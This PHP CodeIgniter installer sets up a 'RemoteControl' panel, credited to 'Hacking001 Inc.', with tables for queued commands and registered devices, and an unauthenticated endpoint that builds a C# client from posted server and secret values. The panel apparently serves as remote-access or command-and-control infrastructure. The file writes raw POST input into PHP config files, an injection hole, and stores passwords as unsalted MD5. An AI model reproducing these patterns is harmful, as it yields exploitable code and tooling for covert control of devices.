<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Install extends CI_Controller {
	protected function CheckInstallExisted() {
		if(is_file(APPPATH . '../config.inc.php')) {
			return true;
		} else {
			return false;
		}
	}
	protected function WriteDatabaseConfigs($data) {
		$this->load->helper('file');
		$this->load->helper('string');
		$str = sprintf(read_file(APPPATH . 'config/database.tpl'), $data['hot'], $data['usr'], $data['pwd'], $data['dbn']);
		write_file(APPPATH . 'config/database.php', $str, 'w');
		$this->load->database();
		$this->db->query('CREATE TABLE `commands` (`cid` int(11) NOT NULL, `sec` char(32) NOT NULL, `ack` char(32) NOT NULL, `tim` datetime NOT NULL, `act` char(16) NOT NULL, `tex` longtext NOT NULL, `res` longtext, `fin` int(11) NOT NULL DEFAULT ' . '0' . ' ) ENGINE=MyISAM DEFAULT CHARSET=utf8');
		$this->db->query('CREATE TABLE `devices` (`cid` int(11) NOT NULL, `sec` char(32) NOT NULL, `ack` char(32) NOT NULL, `rip` char(128) NOT NULL, `sip` char(128) NOT NULL, `hot` char(128) NOT NULL, `ipc` longtext NOT NULL, `tim` datetime NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8');
		$this->db->query('CREATE TABLE `members` (`cid` int(11) NOT NULL, `usr` char(16) NOT NULL, `pwd` char(32) NOT NULL, `ema` char(64) NOT NULL, `sec` char(32) NOT NULL, `pkt` char(32) NOT NULL, `rip` char(128) NOT NULL, `tim` datetime NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8');
		$this->db->query('ALTER TABLE `commands` ADD PRIMARY KEY (`cid`)');
		$this->db->query('ALTER TABLE `devices` ADD PRIMARY KEY (`cid`)');
		$this->db->query('ALTER TABLE `members` ADD PRIMARY KEY (`cid`)');
		$this->db->query('ALTER TABLE `commands` MODIFY `cid` int(11) NOT NULL AUTO_INCREMENT');
		$this->db->query('ALTER TABLE `devices` MODIFY `cid` int(11) NOT NULL AUTO_INCREMENT');
		$this->db->query('ALTER TABLE `members` MODIFY `cid` int(11) NOT NULL AUTO_INCREMENT');
		$str = base64_encode(json_encode(array(
			'sitename' => 'RemoteControl',
			'copyrights' => '© 2017 <a href="https://github.com/hacking001">Hacking001 Inc.</a>',
			'register' => 'on',
			'maintain' => NULL,
		)));
		$str = sprintf(read_file(APPPATH . 'config/config.tpl'), $str);
		write_file(APPPATH . '../config.inc.php', $str, 'w');
		$t = array($data['admin_usr'], $data['admin_pwd'], $data['admin_ema'], random_string('alnum', 32), random_string('alnum', 32), $_SERVER['REMOTE_ADDR'], date('Y-m-d H:i:s'));
		return $this->db->query('INSERT INTO members (usr, pwd, ema, sec, pkt, rip, tim) VALUES (?, md5(?), ?, ?, ?, ?, ?)', $t);
	}
	public function Index() {
		if($this->CheckInstallExisted()) {
			$this->load->view('Jumper', array('code' => 0, 'msg' => '程序已安装', 'url' => '/Console/Login'));
		} else {
			$this->load->view('Install');
		}
	}
	public function Setup() {
		if($this->CheckInstallExisted()) {
			$this->load->view('Jumper', array('code' => 0, 'msg' => '程序已安装', 'url' => '/Console/Login'));
		} else {
			$data = array(
				'hot'       => $this->input->post(   'hot'  ),
				'usr'       => $this->input->post(   'usr'  ),
				'pwd'       => $this->input->post(   'pwd'  ),
				'dbn'       => $this->input->post(   'dbn'  ),
				'admin_usr' => $this->input->post('username'),
				'admin_pwd' => $this->input->post('password'),
				'admin_ema' => $this->input->post('emailadd'),
			);
			if($this->WriteDatabaseConfigs($data)) {
				$this->load->view('Jumper', array('code' => 1, 'msg' => '安装成功', 'url' => '/Console/Login'));
			} else {
				$this->load->view('Jumper', array('code' => 0, 'msg' => '安装失败', 'url' => '/Install/Index'));
			}
		}
	}
	public function GetCsharpCode($action = '') {
		header('Content-Type: text/plain; charset=UTF-8');
		switch($action) {
			case 'Program':
				$str = file_get_contents(APPPATH . 'config/csharp_program.cs');
				$str = str_replace('6AKlOU1ks04drtVCeMTQJ_1', $this->input->post('SH') , $str);
				$str = str_replace('6AKlOU1ks04drtVCeMTQJ_2', $this->input->post('SEC'), $str);
				$str = str_replace('6AKlOU1ks04drtVCeMTQJ_3', $this->input->post('ENV'), $str);
				$str = str_replace('6AKlOU1ks04drtVCeMTQJ_4', $this->input->post('RUN'), $str);
            	echo $str;
				break;
			case 'SimpleJson':
				$str = file_get_contents(APPPATH . 'config/csharp_simplejson.cs');
				echo $str;
				break;
			default:
				break;
		}
	}
}